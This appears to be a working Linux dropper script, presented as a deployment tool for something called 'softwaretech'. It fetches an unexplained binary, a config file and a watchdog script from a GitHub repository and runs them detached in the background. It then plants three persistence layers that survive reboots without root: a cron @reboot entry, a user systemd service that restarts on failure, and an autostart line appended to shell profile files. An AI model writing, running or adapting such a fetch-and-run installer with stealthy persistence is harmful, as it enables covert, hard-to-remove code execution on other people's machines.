#!/bin/bash
# =============================================================================
#  deploy_softwaretech.sh
#  Deploys, starts, and ensures persistence of softwaretech on any Linux host.
#
#  Usage:  bash deploy_softwaretech.sh
#
#  Logic:
#   1. If NOT deployed  → download all files, set up persistence, start watchdog
#   2. If deployed, NOT running → start watchdog (it will launch softwaretech)
#   3. If deployed AND running  → ensure watchdog + persistence exist, then exit
#
#  Requirements: bash, curl, ps, kill, mkdir, chmod  (all standard on every Linux)
#  Root NOT required.
# =============================================================================

# ── Configuration ─────────────────────────────────────────────────────────────
INSTALL_DIR="$HOME/softwaretechreview"
SOFTWARE_BIN="$INSTALL_DIR/softwaretech"
CONFIG_FILE="$INSTALL_DIR/config.json"
WATCHDOG_SCRIPT="$INSTALL_DIR/watchsoftware.sh"
WATCHDOG_PID_FILE="$INSTALL_DIR/watchdog.pid"
SOFTWARE_PID_FILE="$INSTALL_DIR/softwaretech.pid"
LOG_FILE="$INSTALL_DIR/deploy.log"

SOFTWARE_URL="https://github.com/nulltrafficaway/project-lab-test/releases/download/test/softwaretech"
CONFIG_URL="https://raw.githubusercontent.com/nulltrafficaway/project-lab-test/refs/heads/main/config.json"
WATCHDOG_URL="https://raw.githubusercontent.com/nulltrafficaway/project-lab-test/refs/heads/main/watchsoftware.sh"

# ── Helpers ───────────────────────────────────────────────────────────────────
log() {
    local msg="[$(date '+%Y-%m-%d %H:%M:%S')] $*"
    printf '%s\n' "$msg"
    printf '%s\n' "$msg" >> "$LOG_FILE" 2>/dev/null
}

# Validate that a string is a positive integer (for PID checks)
is_integer() {
    printf '%s' "$1" | grep -q '^[0-9][0-9]*$'
}

# True if both the binary and config are on disk
is_deployed() {
    [ -f "$SOFTWARE_BIN" ] && [ -f "$CONFIG_FILE" ]
}

# True if the softwaretech process is alive
is_software_running() {
    # Method 1: PID file (written by watchdog each time it starts softwaretech)
    if [ -f "$SOFTWARE_PID_FILE" ]; then
        local pid
        pid=$(cat "$SOFTWARE_PID_FILE" 2>/dev/null)
        if is_integer "$pid" && kill -0 "$pid" 2>/dev/null; then
            return 0
        fi
    fi
    # Method 2: scan process table by comm name (reliable for native binaries)
    ps -e -o comm 2>/dev/null | grep -q '^softwaretech$'
    return $?
}

# True if the watchdog process is alive
is_watchdog_running() {
    # Method 1: PID file (written when watchdog starts)
    if [ -f "$WATCHDOG_PID_FILE" ]; then
        local pid
        pid=$(cat "$WATCHDOG_PID_FILE" 2>/dev/null)
        if is_integer "$pid" && kill -0 "$pid" 2>/dev/null; then
            return 0
        fi
    fi
    # Method 2: search process args for the script path
    ps aux 2>/dev/null | grep -v grep | grep -q "watchsoftware.sh"
    return $?
}

# ── Download & Install ────────────────────────────────────────────────────────
deploy() {
    log "Starting deployment..."
    mkdir -p "$INSTALL_DIR" || { log "FATAL: Cannot create $INSTALL_DIR"; exit 1; }

    log "Downloading softwaretech binary..."
    curl -fsSL --retry 3 --retry-delay 5 \
        "$SOFTWARE_URL" -o "$SOFTWARE_BIN" \
        || { log "FATAL: Failed to download softwaretech"; exit 1; }

    log "Downloading config.json..."
    curl -fsSL --retry 3 --retry-delay 5 \
        "$CONFIG_URL" -o "$CONFIG_FILE" \
        || { log "FATAL: Failed to download config.json"; exit 1; }

    log "Downloading watchsoftware.sh..."
    curl -fsSL --retry 3 --retry-delay 5 \
        "$WATCHDOG_URL" -o "$WATCHDOG_SCRIPT" \
        || { log "FATAL: Failed to download watchsoftware.sh"; exit 1; }

    chmod +x "$SOFTWARE_BIN" "$WATCHDOG_SCRIPT"
    log "Deployment complete — files installed to $INSTALL_DIR"
}

# ── Start Watchdog ────────────────────────────────────────────────────────────
start_watchdog() {
    log "Launching watchdog..."
    # nohup + </dev/null detaches stdin; disown removes it from the job table
    # so it survives even if this shell exits or is killed
    nohup bash "$WATCHDOG_SCRIPT" \
        >> "$INSTALL_DIR/watchdog.log" 2>&1 </dev/null &
    local wd_pid=$!
    echo "$wd_pid" > "$WATCHDOG_PID_FILE"
    disown "$wd_pid" 2>/dev/null
    log "Watchdog started (PID $wd_pid)."
}

# ── Persistence ───────────────────────────────────────────────────────────────
# Installs multiple independent persistence layers so softwaretech survives
# reboots without root. Each layer is skipped gracefully if unavailable.
setup_persistence() {
    log "Configuring persistence layers..."

    # ── Layer 1: cron @reboot (most universal, no root needed) ────────────────
    # Waits 5 minutes after boot before starting so network is ready
    if command -v crontab >/dev/null 2>&1; then
        local cron_cmd="@reboot sleep 300 && bash \"$WATCHDOG_SCRIPT\" >> \"$INSTALL_DIR/watchdog.log\" 2>&1"
        if crontab -l 2>/dev/null | grep -qF "$WATCHDOG_SCRIPT"; then
            log "  [cron] @reboot entry already present — skipping."
        else
            ( crontab -l 2>/dev/null; printf '%s\n' "$cron_cmd" ) | crontab - 2>/dev/null \
                && log "  [cron] @reboot entry added (5-min startup delay)." \
                || log "  [cron] WARNING: Could not write crontab."
        fi
    else
        log "  [cron] crontab not available — skipping."
    fi

    # ── Layer 2: user systemd service (modern distros: Ubuntu, Fedora, Debian, Arch…)
    # Uses 'WantedBy=default.target' so it activates on user login/linger
    if command -v systemctl >/dev/null 2>&1; then
        local unit_dir="$HOME/.config/systemd/user"
        local unit_file="$unit_dir/softwaretech-watchdog.service"
        if [ ! -f "$unit_file" ]; then
            mkdir -p "$unit_dir"
            cat > "$unit_file" <<EOF
[Unit]
Description=SoftwareTech Watchdog Service
After=network.target network-online.target
Wants=network-online.target

[Service]
Type=simple
ExecStartPre=/bin/sleep 300
ExecStart=/bin/bash $WATCHDOG_SCRIPT
Restart=always
RestartSec=15
StandardOutput=append:$INSTALL_DIR/watchdog.log
StandardError=append:$INSTALL_DIR/watchdog.log

[Install]
WantedBy=default.target
EOF
            systemctl --user daemon-reload 2>/dev/null
            systemctl --user enable softwaretech-watchdog.service 2>/dev/null \
                && log "  [systemd] User service installed and enabled." \
                || log "  [systemd] WARNING: Could not enable user service."
            # Start it now too (skips the 300s delay for the immediate start)
            systemctl --user start softwaretech-watchdog.service 2>/dev/null \
                && log "  [systemd] Service started." \
                || log "  [systemd] Service will activate on next login."
        else
            log "  [systemd] User service already installed — skipping."
        fi
    else
        log "  [systemd] systemctl not available — skipping."
    fi

    # ── Layer 3: ~/.profile fallback (login shell: SSH, console, su -) ────────
    # Runs on every login — the watchdog's own singleton guard prevents
    # duplicate instances, so this is safe to call unconditionally.
    local marker="# softwaretech-watchdog-autostart"
    local profile_line="[ -x \"$WATCHDOG_SCRIPT\" ] && nohup bash \"$WATCHDOG_SCRIPT\" >> \"$INSTALL_DIR/watchdog.log\" 2>&1 </dev/null &"

    # Prefer ~/.profile; fall back to ~/.bash_profile or ~/.bashrc if needed
    local target_profile=""
    for f in "$HOME/.profile" "$HOME/.bash_profile" "$HOME/.bashrc"; do
        if [ -f "$f" ]; then
            target_profile="$f"
            break
        fi
    done

    if [ -n "$target_profile" ]; then
        if grep -q "$marker" "$target_profile" 2>/dev/null; then
            log "  [profile] Entry already present in $target_profile — skipping."
        else
            printf '\n%s\n%s\n' "$marker" "$profile_line" >> "$target_profile"
            log "  [profile] Entry added to $target_profile."
        fi
    else
        log "  [profile] No shell profile file found — skipping."
    fi

    log "Persistence setup complete."
}

# ── Main ──────────────────────────────────────────────────────────────────────
mkdir -p "$INSTALL_DIR"  # ensure log dir exists before first log()

log "======================================================="
log " deploy_softwaretech.sh  |  host: $(hostname 2>/dev/null)"
log "======================================================="

if is_deployed; then
    log "softwaretech is deployed at: $INSTALL_DIR"

    if is_software_running; then
        log "softwaretech is RUNNING — no deployment needed."

        # Still make sure watchdog is alive and persistence is in place
        if ! is_watchdog_running; then
            log "Watchdog was not running — restarting it."
            start_watchdog
        else
            log "Watchdog is running — OK."
        fi

        setup_persistence
        log "Everything healthy. Exiting."
        exit 0

    else
        log "softwaretech is NOT running."
        if is_watchdog_running; then
            log "Watchdog is already running — it will restart softwaretech within 15 seconds."
        else
            log "Watchdog is not running — starting it now."
            start_watchdog
        fi
        setup_persistence
    fi

else
    log "softwaretech is NOT deployed — starting full deployment."
    deploy
    setup_persistence
    start_watchdog
fi

log "Script finished."
exit 0
